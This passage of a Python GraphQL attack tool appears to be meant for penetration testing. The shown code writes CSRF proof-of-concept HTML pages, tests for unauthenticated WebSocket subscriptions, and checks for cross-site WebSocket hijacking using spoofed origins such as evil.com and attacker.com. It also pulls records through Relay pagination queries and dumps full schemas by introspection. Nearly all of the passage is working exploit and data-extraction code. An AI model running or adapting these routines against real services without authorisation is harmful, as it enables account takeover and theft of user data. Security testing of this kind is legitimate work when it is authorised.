    document.getElementById('result').textContent = 'Error: ' + e;
  }});
</script>
<pre id="result">Loading...</pre>
<p>Note: This only works if CORS allows the origin or same-origin policy is satisfied.</p>
</body>
</html>"""
    pocs.append(("csrf_fetch.html", poc_fetch))

    # Save PoCs
    for filename, content in pocs:
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, 'w') as f:
            f.write(content)
        print(colorize(f"  [+] Saved: {filepath}", "green"))

    if not get_works and not urlencoded_works:
        print(colorize("\n  [-] Endpoint only accepts JSON POST - CSRF is harder but not impossible", "yellow"))
        print("      Check for CORS misconfigurations or missing CSRF tokens")


# ═══════════════════════════════════════════════
# WEBSOCKET TESTING
# ═══════════════════════════════════════════════

def websocket_test(url, method, proxy, headers, use_json):
    """
    Test GraphQL over WebSocket subscriptions.
    Checks for authentication bypass, CSWSH, and subscription abuse.
    """
    if not HAS_WEBSOCKET:
        print(colorize("[!] websocket-client not installed. Run: pip install websocket-client", "red"))
        return

    print(colorize("\n[*] GraphQL WebSocket Subscription Test", "cyan"))

    ws_url = url.replace("http://", "ws://").replace("https://", "wss://")
    print(f"[*] WebSocket URL: {ws_url}")

    # Test 1: Unauthenticated connection
    print(colorize("\n[*] Test 1: Unauthenticated WebSocket connection...", "cyan"))
    try:
        ws = ws_lib.create_connection(
            ws_url,
            subprotocols=["graphql-ws", "graphql-transport-ws"],
            sslopt={"cert_reqs": ssl.CERT_NONE},
            timeout=10
        )
        ws.send(json.dumps({"type": "connection_init", "payload": {}}))
        result = ws.recv()
        data = json.loads(result)

        if data.get("type") == "connection_ack":
            print(colorize("  [!] VULNERABLE: Unauthenticated connection accepted!", "red"))

            # Try introspection over WebSocket
            ws.send(json.dumps({
                "id": "1",
                "type": "start",
                "payload": {"query": "{__schema{queryType{name}}}"}
            }))
            result = ws.recv()
            print(f"  Response: {result[:200]}")
        else:
            print(f"  Response: {data}")

        ws.close()
    except Exception as e:
        print(colorize(f"  [-] Connection failed: {e}", "yellow"))

    # Test 2: Connection with auth headers
    if headers:
        print(colorize("\n[*] Test 2: Authenticated WebSocket connection...", "cyan"))
        try:
            ws = ws_lib.create_connection(
                ws_url,
                header=headers if isinstance(headers, dict) else {},
                subprotocols=["graphql-ws", "graphql-transport-ws"],
                sslopt={"cert_reqs": ssl.CERT_NONE},
                timeout=10
            )
            ws.send(json.dumps({
                "type": "connection_init",
                "payload": headers if isinstance(headers, dict) else {}
            }))
            result = ws.recv()
            data = json.loads(result)
            print(f"  Response: {data}")

            if data.get("type") == "connection_ack":
                print(colorize("  [+] Authenticated connection established", "green"))

                # Test subscription
                sub_query = input("  Subscription query (or press Enter for default) > ").strip()
                if not sub_query:
                    sub_query = "subscription { __typename }"

                ws.send(json.dumps({
                    "id": "2",
                    "type": "start",
                    "payload": {"query": sub_query}
                }))

                try:
                    result = ws.recv()
                    print(f"  Subscription response: {result[:300]}")
                except Exception:
                    print("  No subscription data received (timeout)")

            ws.close()
        except Exception as e:
            print(colorize(f"  [-] Error: {e}", "yellow"))

    # Test 3: CSWSH check
    print(colorize("\n[*] Test 3: Cross-Site WebSocket Hijacking (CSWSH) check...", "cyan"))
    print("  [*] Testing with different Origin headers...")

    test_origins = ["https://evil.com", "null", "https://attacker.com"]
    for origin in test_origins:
        try:
            ws = ws_lib.create_connection(
                ws_url,
                origin=origin,
                subprotocols=["graphql-ws"],
                sslopt={"cert_reqs": ssl.CERT_NONE},
                timeout=10
            )
            ws.send(json.dumps({"type": "connection_init", "payload": {}}))
            result = ws.recv()
            data = json.loads(result)

            if data.get("type") == "connection_ack":
                print(colorize(f"  [!] CSWSH: Origin '{origin}' accepted!", "red"))
            else:
                print(f"  Origin '{origin}': {data.get('type', 'rejected')}")

            ws.close()
        except Exception as e:
            print(f"  Origin '{origin}': Connection rejected ({str(e)[:50]})")


# ═══════════════════════════════════════════════
# DATA EXTRACTION HELPERS
# ═══════════════════════════════════════════════

def edges_extract(url, method, proxy, headers, use_json):
    """
    Extract data using Relay-style edges/nodes pagination pattern.
    """
    print(colorize("\n[*] Edges/Nodes Data Extraction", "cyan"))

    field_name = input("Root field name (e.g., users, posts): ").strip()
    node_fields = input("Node fields to extract (e.g., id,name,email): ").strip() or "id"

    # Try different pagination patterns
    patterns = [
        # Standard Relay pagination
        f'{{ {field_name} {{ edges {{ node {{ {node_fields} }} cursor }} pageInfo {{ hasNextPage endCursor }} }} }}',
        # With first/after
        f'{{ {field_name}(first: 100) {{ edges {{ node {{ {node_fields} }} cursor }} pageInfo {{ hasNextPage endCursor }} }} }}',
        # Simple connection
        f'{{ {field_name} {{ nodes {{ {node_fields} }} totalCount }} }}',
        # Direct list
        f'{{ {field_name} {{ {node_fields} }} }}',
    ]

    for i, pattern in enumerate(patterns):
        print(colorize(f"\n  [*] Trying pattern {i+1}...", "cyan"))
        result = exec_graphql(url, method, pattern, proxy, headers, use_json)
        if result and "error" not in str(result).lower()[:50]:
            print(result)

            # Handle pagination
            try:
                data = json.loads(result.replace("\033[92m", "").replace("\033[0m", "")
                                       .replace("\033[95m", ""))
                page_info = None
                if 'data' in data:
                    for key in data['data']:
                        if isinstance(data['data'][key], dict):
                            page_info = data['data'][key].get('pageInfo')

                if page_info and page_info.get('hasNextPage'):
                    print(colorize("\n  [+] More pages available!", "green"))
                    fetch_more = input("  Fetch next page? (y/n): ").strip().lower()
                    if fetch_more == 'y':
                        cursor = page_info.get('endCursor', '')
                        next_query = f'{{ {field_name}(first: 100, after: "{cursor}") {{ edges {{ node {{ {node_fields} }} cursor }} pageInfo {{ hasNextPage endCursor }} }} }}'
                        print(exec_graphql(url, method, next_query, proxy, headers, use_json))
            except Exception:
                pass

            break
        else:
            print(colorize(f"  [-] Pattern {i+1} failed", "yellow"))


# ═══════════════════════════════════════════════
# SCHEMA EXPORT
# ═══════════════════════════════════════════════

def save_schema(url, method, proxy, headers, use_json):
    """
    Dump and save the full schema to a JSON file.
    """
    print(colorize("\n[*] Dumping and saving schema...", "cyan"))

    payload = INTROSPECTION_QUERY_V15.replace("\n", " ")
    r = requester(url, method, payload, proxy, headers, use_json)

    if r is None:
        print(colorize("[!] No response", "red"))
        return

    try:
        schema = r.json()
        if 'data' not in schema:
            print(colorize("[!] No data in response", "red"))
            return

        filename = input("Output filename (default: schema.json): ").strip() or "schema.json"
        with open(filename, 'w') as f:
            json.dump(schema, f, indent=2)
        print(colorize(f"[+] Schema saved to {filename}", "green"))

        # Also save a simplified version
        simplified = {"queries": [], "mutations": [], "subscriptions": [], "types": []}
        for t in schema['data']['__schema'].get('types', []):
            if t['name'].startswith('__'):
                continue
            type_info_dict = {"name": t['name'], "kind": t['kind'], "fields": []}
            for f_item in t.get('fields', []) or []:
                type_info_dict["fields"].append(f_item['name'])
            simplified["types"].append(type_info_dict)

        simp_filename = filename.replace('.json', '_simplified.json')
        with open(simp_filename, 'w') as f:
            json.dump(simplified, f, indent=2)
        print(colorize(f"[+] Simplified schema saved to {simp_filename}", "green"))

    except Exception as e:
        print(colorize(f"[!] Error: {e}", "red"))
